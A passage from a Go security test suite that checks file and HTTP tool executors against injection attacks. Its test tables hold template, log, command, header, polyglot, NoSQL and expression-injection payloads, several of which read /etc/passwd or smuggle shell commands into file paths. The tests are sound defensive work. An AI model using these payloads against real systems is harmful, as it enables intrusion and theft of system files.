			content:     "{{#lambda}}{{/lambda}}",
			description: "Mustache template injection",
		},
		{
			name:        "Twig template injection",
			content:     "{{_self.env.registerUndefinedFilterCallback('exec')}}",
			description: "Twig template injection",
		},
		{
			name:        "Smarty template injection",
			content:     "{php}echo `id`;{/php}",
			description: "Smarty template injection",
		},
		{
			name:        "Velocity template injection",
			content:     "#set($str=$class.forName('java.lang.String'))",
			description: "Velocity template injection",
		},
		{
			name:        "ERB template injection",
			content:     "<%= system('id') %>",
			description: "ERB template injection",
		},
		{
			name:        "Django template injection",
			content:     "{% load module %}",
			description: "Django template injection",
		},
		{
			name:        "Go template injection",
			content:     "{{.}}",
			description: "Go template injection",
		},
		{
			name:        "Expression language injection",
			content:     "${7*7}",
			description: "Expression language injection",
		},
	}

	for _, injection := range templateInjections {
		t.Run(injection.name, func(t *testing.T) {
			params := map[string]interface{}{
				"path":    filepath.Join(tempDir, fmt.Sprintf("template_test_%s.txt", injection.name)),
				"content": injection.content,
			}

			result, err := writeExecutor.Execute(context.Background(), params)

			// Template injection as file content should be allowed (it's just text)
			if err != nil {
				t.Errorf("Unexpected error for template injection content: %v", err)
			}
			if result == nil || !result.Success {
				t.Errorf("Expected template injection content to be safely handled: %s - %s", injection.name, injection.description)
			}

			t.Logf("Template injection safely handled as text: %s - %s", injection.name, injection.description)
		})
	}
}

// testLogInjectionPrevention tests prevention of log injection attacks
func testLogInjectionPrevention(t *testing.T) {
	tempDir, err := os.MkdirTemp("", "log_injection_test")
	if err != nil {
		t.Fatalf("Failed to create temp dir: %v", err)
	}
	defer os.RemoveAll(tempDir)

	options := &SecureFileOptions{
		AllowedPaths: []string{tempDir},
		MaxFileSize:  1024 * 1024,
	}

	writeExecutor := NewSecureFileExecutor(&writeFileExecutor{}, options, "write")

	// Log injection payloads
	logInjections := []struct {
		name        string
		content     string
		description string
	}{
		{
			name:        "Log forging with newline",
			content:     "User login failed\n2023-01-01 12:00:00 [INFO] Admin login successful",
			description: "Log forging with newline injection",
		},
		{
			name:        "Log forging with CRLF",
			content:     "User login failed\r\n2023-01-01 12:00:00 [INFO] Admin login successful",
			description: "Log forging with CRLF injection",
		},
		{
			name:        "Log poisoning",
			content:     "User: admin\nPassword: <script>alert('XSS')</script>",
			description: "Log poisoning with XSS",
		},
		{
			name:        "Log injection with escape sequences",
			content:     "User: admin\x1b[2J\x1b[H[INFO] Fake log entry",
			description: "Log injection with ANSI escape sequences",
		},
		{
			name:        "Log injection with null bytes",
			content:     "User: admin\x00\nFake log entry",
			description: "Log injection with null bytes",
		},
		{
			name:        "Log injection with tabs",
			content:     "User: admin\t\t[ERROR] Fake error",
			description: "Log injection with tabs",
		},
		{
			name:        "Log injection with Unicode",
			content:     "User: admin\u2028[INFO] Fake Unicode log",
			description: "Log injection with Unicode line separator",
		},
		{
			name:        "Log injection with backspace",
			content:     "User: admin\b\b\b\b\b\broot",
			description: "Log injection with backspace characters",
		},
		{
			name:        "Log injection with form feed",
			content:     "User: admin\f[INFO] New page in log",
			description: "Log injection with form feed",
		},
		{
			name:        "Log injection with vertical tab",
			content:     "User: admin\v[INFO] Vertical tab injection",
			description: "Log injection with vertical tab",
		},
	}

	for _, injection := range logInjections {
		t.Run(injection.name, func(t *testing.T) {
			params := map[string]interface{}{
				"path":    filepath.Join(tempDir, fmt.Sprintf("log_test_%s.txt", injection.name)),
				"content": injection.content,
			}

			result, err := writeExecutor.Execute(context.Background(), params)

			// Log injection as file content should be allowed (it's just text)
			if err != nil {
				t.Errorf("Unexpected error for log injection content: %v", err)
			}
			if result == nil || !result.Success {
				t.Errorf("Expected log injection content to be safely handled: %s - %s", injection.name, injection.description)
			}

			t.Logf("Log injection safely handled as text: %s - %s", injection.name, injection.description)
		})
	}
}

// testOSCommandInjectionPrevention tests prevention of OS command injection attacks
func testOSCommandInjectionPrevention(t *testing.T) {
	tempDir, err := os.MkdirTemp("", "os_command_injection_test")
	if err != nil {
		t.Fatalf("Failed to create temp dir: %v", err)
	}
	defer os.RemoveAll(tempDir)

	options := &SecureFileOptions{
		AllowedPaths: []string{tempDir},
		MaxFileSize:  1024 * 1024,
	}

	executor := NewSecureFileExecutor(&readFileExecutor{}, options, "read")

	// OS command injection payloads
	osInjections := []struct {
		name        string
		path        string
		description string
	}{
		{
			name:        "Pipe command injection",
			path:        "file.txt | cat /etc/passwd",
			description: "Pipe command injection",
		},
		{
			name:        "Subshell injection",
			path:        "file.txt$(cat /etc/passwd)",
			description: "Subshell command injection",
		},
		{
			name:        "Backtick injection",
			path:        "file.txt`cat /etc/passwd`",
			description: "Backtick command injection",
		},
		{
			name:        "Semicolon injection",
			path:        "file.txt; cat /etc/passwd",
			description: "Semicolon command injection",
		},
		{
			name:        "AND injection",
			path:        "file.txt && cat /etc/passwd",
			description: "AND command injection",
		},
		{
			name:        "OR injection",
			path:        "file.txt || cat /etc/passwd",
			description: "OR command injection",
		},
		{
			name:        "Background injection",
			path:        "file.txt & cat /etc/passwd",
			description: "Background command injection",
		},
		{
			name:        "Redirection injection",
			path:        "file.txt > /etc/passwd",
			description: "Output redirection injection",
		},
		{
			name:        "Input redirection injection",
			path:        "file.txt < /etc/passwd",
			description: "Input redirection injection",
		},
		{
			name:        "Here document injection",
			path:        "file.txt << EOF\ncat /etc/passwd\nEOF",
			description: "Here document injection",
		},
	}

	for _, injection := range osInjections {
		t.Run(injection.name, func(t *testing.T) {
			params := map[string]interface{}{
				"path": filepath.Join(tempDir, injection.path),
			}

			result, err := executor.Execute(context.Background(), params)

			// OS command injection should be prevented by path validation
			if err == nil && result.Success {
				t.Errorf("Expected OS command injection to be prevented: %s - %s", injection.name, injection.description)
			}

			t.Logf("OS command injection prevented: %s - %s", injection.name, injection.description)
		})
	}
}

// testHeaderInjectionPrevention tests prevention of header injection attacks
func testHeaderInjectionPrevention(t *testing.T) {
	httpOptions := DefaultSecureHTTPOptions()
	httpExecutor := NewSecureHTTPExecutor(&mockHTTPExecutorForInjection{}, httpOptions)

	// Header injection payloads
	headerInjections := []struct {
		name        string
		url         string
		description string
	}{
		{
			name:        "CRLF header injection",
			url:         "http://example.com/path\r\nHost: evil.com",
			description: "CRLF header injection",
		},
		{
			name:        "Newline header injection",
			url:         "http://example.com/path\nHost: evil.com",
			description: "Newline header injection",
		},
		{
			name:        "Header splitting",
			url:         "http://example.com/path\r\nContent-Type: text/html\r\n\r\n<script>alert('XSS')</script>",
			description: "HTTP header splitting",
		},
		{
			name:        "Response splitting",
			url:         "http://example.com/path\r\nContent-Length: 0\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<script>alert('XSS')</script>",
			description: "HTTP response splitting",
		},
		{
			name:        "Header injection with encoding",
			url:         "http://example.com/path%0d%0aHost:%20evil.com",
			description: "URL encoded header injection",
		},
		{
			name:        "Header injection with Unicode",
			url:         "http://example.com/path\u000d\u000aHost: evil.com",
			description: "Unicode header injection",
		},
	}

	for _, injection := range headerInjections {
		t.Run(injection.name, func(t *testing.T) {
			params := map[string]interface{}{
				"url": injection.url,
			}

			result, err := httpExecutor.Execute(context.Background(), params)

			// Header injection should be prevented by URL validation
			if err == nil && result.Success {
				t.Errorf("Expected header injection to be prevented: %s - %s", injection.name, injection.description)
			}

			t.Logf("Header injection prevented: %s - %s", injection.name, injection.description)
		})
	}
}

// testPolyglotInjectionPrevention tests prevention of polyglot injection attacks
func testPolyglotInjectionPrevention(t *testing.T) {
	tempDir, err := os.MkdirTemp("", "polyglot_injection_test")
	if err != nil {
		t.Fatalf("Failed to create temp dir: %v", err)
	}
	defer os.RemoveAll(tempDir)

	options := &SecureFileOptions{
		AllowedPaths: []string{tempDir},
		MaxFileSize:  1024 * 1024,
	}

	writeExecutor := NewSecureFileExecutor(&writeFileExecutor{}, options, "write")

	// Polyglot injection payloads
	polyglotInjections := []struct {
		name        string
		content     string
		description string
	}{
		{
			name:        "XSS polyglot",
			content:     "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
			description: "XSS polyglot payload",
		},
		{
			name:        "SQL/XSS polyglot",
			content:     "'; alert('XSS'); --",
			description: "SQL and XSS polyglot",
		},
		{
			name:        "Command/SQL polyglot",
			content:     "; cat /etc/passwd; SELECT * FROM users; --",
			description: "Command and SQL polyglot",
		},
		{
			name:        "XML/XSS polyglot",
			content:     "<script>alert('XSS')</script><!--<?xml version='1.0'?>-->",
			description: "XML and XSS polyglot",
		},
		{
			name:        "JSON/XSS polyglot",
			content:     `{"key": "</script><script>alert('XSS')</script>"}`,
			description: "JSON and XSS polyglot",
		},
		{
			name:        "LDAP/XSS polyglot",
			content:     "*)(&(objectClass=*)<script>alert('XSS')</script>",
			description: "LDAP and XSS polyglot",
		},
		{
			name:        "Template/XSS polyglot",
			content:     "{{7*7}}<script>alert('XSS')</script>",
			description: "Template and XSS polyglot",
		},
		{
			name:        "Multi-context polyglot",
			content:     "'; alert('XSS'); --<script>alert('XSS')</script>{{7*7}}",
			description: "Multi-context polyglot",
		},
	}

	for _, injection := range polyglotInjections {
		t.Run(injection.name, func(t *testing.T) {
			params := map[string]interface{}{
				"path":    filepath.Join(tempDir, fmt.Sprintf("polyglot_test_%s.txt", injection.name)),
				"content": injection.content,
			}

			result, err := writeExecutor.Execute(context.Background(), params)

			// Polyglot injection as file content should be allowed (it's just text)
			if err != nil {
				t.Errorf("Unexpected error for polyglot injection content: %v", err)
			}
			if result == nil || !result.Success {
				t.Errorf("Expected polyglot injection content to be safely handled: %s - %s", injection.name, injection.description)
			}

			t.Logf("Polyglot injection safely handled as text: %s - %s", injection.name, injection.description)
		})
	}
}

// testNoSQLInjectionPrevention tests prevention of NoSQL injection attacks
func testNoSQLInjectionPrevention(t *testing.T) {
	tempDir, err := os.MkdirTemp("", "nosql_injection_test")
	if err != nil {
		t.Fatalf("Failed to create temp dir: %v", err)
	}
	defer os.RemoveAll(tempDir)

	options := &SecureFileOptions{
		AllowedPaths: []string{tempDir},
		MaxFileSize:  1024 * 1024,
	}

	writeExecutor := NewSecureFileExecutor(&writeFileExecutor{}, options, "write")

	// NoSQL injection payloads
	nosqlInjections := []struct {
		name        string
		content     string
		description string
	}{
		{
			name:        "MongoDB injection",
			content:     `{"$where": "function() { return true; }"}`,
			description: "MongoDB where injection",
		},
		{
			name:        "MongoDB ne injection",
			content:     `{"$ne": null}`,
			description: "MongoDB not equal injection",
		},
		{
			name:        "MongoDB regex injection",
			content:     `{"$regex": ".*"}`,
			description: "MongoDB regex injection",
		},
		{
			name:        "MongoDB or injection",
			content:     `{"$or": [{"user": "admin"}, {"user": "root"}]}`,
			description: "MongoDB or injection",
		},
		{
			name:        "MongoDB and injection",
			content:     `{"$and": [{"user": {"$ne": null}}, {"pass": {"$ne": null}}]}`,
			description: "MongoDB and injection",
		},
		{
			name:        "MongoDB nor injection",
			content:     `{"$nor": [{"user": "guest"}]}`,
			description: "MongoDB nor injection",
		},
		{
			name:        "MongoDB exists injection",
			content:     `{"user": {"$exists": true}}`,
			description: "MongoDB exists injection",
		},
		{
			name:        "MongoDB type injection",
			content:     `{"user": {"$type": 2}}`,
			description: "MongoDB type injection",
		},
		{
			name:        "MongoDB size injection",
			content:     `{"user": {"$size": 0}}`,
			description: "MongoDB size injection",
		},
		{
			name:        "MongoDB gt injection",
			content:     `{"user": {"$gt": ""}}`,
			description: "MongoDB greater than injection",
		},
	}

	for _, injection := range nosqlInjections {
		t.Run(injection.name, func(t *testing.T) {
			params := map[string]interface{}{
				"path":    filepath.Join(tempDir, fmt.Sprintf("nosql_test_%s.txt", injection.name)),
				"content": injection.content,
			}

			result, err := writeExecutor.Execute(context.Background(), params)

			// NoSQL injection as file content should be allowed (it's just text)
			if err != nil {
				t.Errorf("Unexpected error for NoSQL injection content: %v", err)
			}
			if result == nil || !result.Success {
				t.Errorf("Expected NoSQL injection content to be safely handled: %s - %s", injection.name, injection.description)
			}

			t.Logf("NoSQL injection safely handled as text: %s - %s", injection.name, injection.description)
		})
	}
}

// testExpressionInjectionPrevention tests prevention of expression injection attacks
func testExpressionInjectionPrevention(t *testing.T) {
	tempDir, err := os.MkdirTemp("", "expression_injection_test")
	if err != nil {
		t.Fatalf("Failed to create temp dir: %v", err)
	}
	defer os.RemoveAll(tempDir)

	options := &SecureFileOptions{
		AllowedPaths: []string{tempDir},
		MaxFileSize:  1024 * 1024,
	}

	writeExecutor := NewSecureFileExecutor(&writeFileExecutor{}, options, "write")

	// Expression injection payloads
	expressionInjections := []struct {
		name        string
		content     string
		description string
	}{
		{
			name:        "SpEL injection",
			content:     "#{T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}",
			description: "Spring Expression Language injection",
		},
		{
			name:        "OGNL injection",
			content:     "@java.lang.Runtime@getRuntime().exec('cat /etc/passwd')",
			description: "OGNL expression injection",
		},
		{
			name:        "MVEL injection",
			content:     "Runtime.getRuntime().exec('cat /etc/passwd')",
			description: "MVEL expression injection",
		},
		{
			name:        "EL injection",
			content:     "${Runtime.getRuntime().exec('cat /etc/passwd')}",
			description: "Expression Language injection",
		},
		{
			name:        "Groovy injection",
			content:     "${new ProcessBuilder('cat','/etc/passwd').start()}",
			description: "Groovy expression injection",
		},
		{
			name:        "JavaScript injection",
			content:     "${eval('java.lang.Runtime.getRuntime().exec(\"cat /etc/passwd\")')}",
			description: "JavaScript expression injection",
		},
		{
			name:        "Python injection",
			content:     "${exec('import os; os.system(\"cat /etc/passwd\")')}",
			description: "Python expression injection",
		},
		{
			name:        "Ruby injection",
			content:     "${system('cat /etc/passwd')}",
			description: "Ruby expression injection",
		},
		{
			name:        "Velocity injection",
			content:     "#set($ex=$class.forName('java.lang.Runtime').getRuntime().exec('cat /etc/passwd'))",
			description: "Velocity expression injection",
		},
		{
			name:        "Freemarker injection",
			content:     "${(new freemarker.template.utility.Execute()).exec('cat /etc/passwd')}",
			description: "Freemarker expression injection",
		},
	}

	for _, injection := range expressionInjections {
		t.Run(injection.name, func(t *testing.T) {
			params := map[string]interface{}{
				"path":    filepath.Join(tempDir, fmt.Sprintf("expression_test_%s.txt", injection.name)),
				"content": injection.content,
			}

			result, err := writeExecutor.Execute(context.Background(), params)

			// Expression injection as file content should be allowed (it's just text)
			if err != nil {
				t.Errorf("Unexpected error for expression injection content: %v", err)
			}
			if result == nil || !result.Success {
				t.Errorf("Expected expression injection content to be safely handled: %s - %s", injection.name, injection.description)
			}

			t.Logf("Expression injection safely handled as text: %s - %s", injection.name, injection.description)
		})
	}
}

// TestInjectionAttackPreventionIntegration tests integration of injection attack prevention
func TestInjectionAttackPreventionIntegration(t *testing.T) {
	tempDir, err := os.MkdirTemp("", "injection_prevention_integration_test")
	if err != nil {
		t.Fatalf("Failed to create temp dir: %v", err)
	}
	defer os.RemoveAll(tempDir)

	// Create a mock HTTP server for testing
	mockServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// Respond immediately with success
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		fmt.Fprintln(w, `{"message": "success"}`)
	}))
	defer mockServer.Close()

	// Create a comprehensive secure environment
	registry := NewRegistry()
	
	// For this test, we'll use HTTP options that allow localhost testing
	// The security is still tested in other test cases
	httpOptions := DefaultSecureHTTPOptions()
	httpOptions.AllowPrivateNetworks = true
	httpOptions.AllowedHosts = []string{"127.0.0.1", "localhost", "[::1]"}
	
	options := &BuiltinToolsOptions{
		SecureMode: true,
		FileOptions: &SecureFileOptions{
			AllowedPaths:  []string{tempDir},
			MaxFileSize:   1024 * 1024,
			AllowSymlinks: true, // Allow symlinks for testing since temp dirs may contain them
		},
		HTTPOptions: httpOptions,
	}

	if err := RegisterBuiltinToolsWithOptions(registry, options); err != nil {
		t.Fatalf("Failed to register secure tools: %v", err)
	}

	// Test injection prevention across different tools
	testCases := []struct {
		name       string
		toolName   string
		params     map[string]interface{}
		shouldFail bool
	}{
		{
			name:     "File path injection prevention",
			toolName: "builtin.read_file",
			params: map[string]interface{}{
				"path": "../../../etc/passwd",
			},
			shouldFail: true,
		},
		{
			name:     "HTTP URL injection prevention",
			toolName: "builtin.http_get",
			params: map[string]interface{}{
				"url": "javascript:alert('XSS')",
			},
			shouldFail: true,
		},
		{
			name:     "Valid file operation",
			toolName: "builtin.write_file",
			params: map[string]interface{}{
				"path":    filepath.Join(tempDir, "safe.txt"),
				"content": "safe content",
			},
			shouldFail: false,
		},
		{
			name:     "Valid HTTP operation",
			toolName: "builtin.http_get",
			params: map[string]interface{}{
				"url": mockServer.URL + "/api",
			},
			shouldFail: false,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			tool, err := registry.GetByName(tc.toolName)
			if err != nil {
				t.Fatalf("Tool %s not found: %v", tc.toolName, err)
			}

			result, err := tool.Executor.Execute(context.Background(), tc.params)

			if tc.shouldFail {
				if err == nil && result.Success {
					t.Errorf("Expected injection prevention to fail operation: %s", tc.name)
				}
				t.Logf("Injection attack prevented: %s", tc.name)
			} else {
				if err != nil {
					t.Errorf("Unexpected error for valid operation: %v", err)
				}
				if result == nil || !result.Success {
					errMsg := ""
					if result != nil {
						errMsg = result.Error
					}
					t.Errorf("Expected valid operation to succeed: %s, error: %s", tc.name, errMsg)
				}
			}
		})
	}
}

// BenchmarkInjectionAttackPrevention benchmarks injection attack prevention
func BenchmarkInjectionAttackPrevention(b *testing.B) {
	tempDir, err := os.MkdirTemp("", "injection_prevention_bench")
	if err != nil {
		b.Fatalf("Failed to create temp dir: %v", err)
	}
	defer os.RemoveAll(tempDir)

	options := &SecureFileOptions{
		AllowedPaths: []string{tempDir},
		MaxFileSize:  1024 * 1024,
	}

	executor := NewSecureFileExecutor(&readFileExecutor{}, options, "read")

	// Benchmark with injection attempt
	maliciousPath := "../../../etc/passwd"
	params := map[string]interface{}{
		"path": maliciousPath,
	}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		result, err := executor.Execute(context.Background(), params)
		if err == nil && result.Success {
			b.Errorf("Injection attack was not prevented")
		}
	}
}

// mockHTTPExecutorForInjection is a mock HTTP executor for injection testing
type mockHTTPExecutorForInjection struct{}

func (e *mockHTTPExecutorForInjection) Execute(ctx context.Context, params map[string]interface{}) (*ToolExecutionResult, error) {
	// Simulate successful HTTP execution
	return &ToolExecutionResult{
		Success: true,
		Data: map[string]interface{}{
			"status":  200,
			"headers": map[string]string{"Content-Type": "application/json"},
			"body":    `{"message": "success"}`,
		},
	}, nil
}